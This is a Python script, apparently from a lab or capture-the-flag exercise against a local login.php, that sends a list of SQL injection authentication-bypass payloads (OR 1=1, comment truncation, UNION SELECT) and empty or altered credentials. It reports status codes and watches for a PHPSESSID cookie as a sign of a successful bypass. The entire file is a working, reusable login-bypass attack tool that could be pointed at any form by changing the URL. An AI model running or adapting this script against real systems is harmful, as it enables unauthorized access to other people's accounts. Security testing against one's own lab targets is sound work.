import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target URL
target_url = "http://127.0.0.1:33167/login.php"

# Initialize session
session = requests.Session()

# Test payloads
payloads = [
    # Baseline - normal credentials (should fail)
    {"username": "admin", "password": "admin", "desc": "baseline admin/password"},
    
    # SQL Injection payloads for authentication bypass
    {"username": "admin' OR '1'='1'--", "password": "", "desc": "SQLi OR true"},
    {"username": "admin'--", "password": "", "desc": "SQLi comment"},
    {"username": "admin'#", "password": "", "desc": "SQLi hash comment"},
    {"username": "' OR 1=1--", "password": "", "desc": "SQLi OR 1=1"},
    {"username": "' OR '1'='1", "password": "", "desc": "SQLi OR string true"},
    {"username": "admin' AND '1'='1'--", "password": "", "desc": "SQLi AND true"},
    {"username": "admin' UNION SELECT null,null--", "password": "", "desc": "SQLi UNION null"},
    {"username": "admin' UNION SELECT 1,2--", "password": "", "desc": "SQLi UNION 1,2"},
    
    # Authentication logic flaws
    {"username": "", "password": "", "desc": "empty creds"},
    {"username": "admin", "password": " ", "desc": "whitespace password"},
    {"username": "ADMIN", "password": "ADMIN", "desc": "uppercase ADMIN"}
]

# Test each payload
print("Test# | Payload Type | Status | Cookie | Length")
print("-" * 60)

for i, payload in enumerate(payloads, 1):
    try:
        data = {
            "username": payload["username"],
            "password": payload["password"]
        }
        
        response = session.post(target_url, data=data, allow_redirects=False, timeout=10)
        
        # Check for PHPSESSID cookie
        has_phpsessid = 'PHPSESSID' in response.cookies
        
        # Print results
        print(f"{i:2d}    | {payload['desc']:<12} | {response.status_code:3d}    | {str(has_phpsessid):<6} | {len(response.content):>6} bytes")
        
    except Exception as e:
        print(f"{i:2d}    | {payload['desc']:<12} | ERROR   |        | {str(e)}")

# Check if any login was successful by looking for session cookies
if any('PHPSESSID' in str(resp.cookies) for resp in [requests.post(target_url, data=p, allow_redirects=False, timeout=5) for p in payloads[1:6]]):
    print("\n[!] Potential successful login detected! Session cookie found with one of the payloads.")
else:
    print("\n[?] Checking session state...")
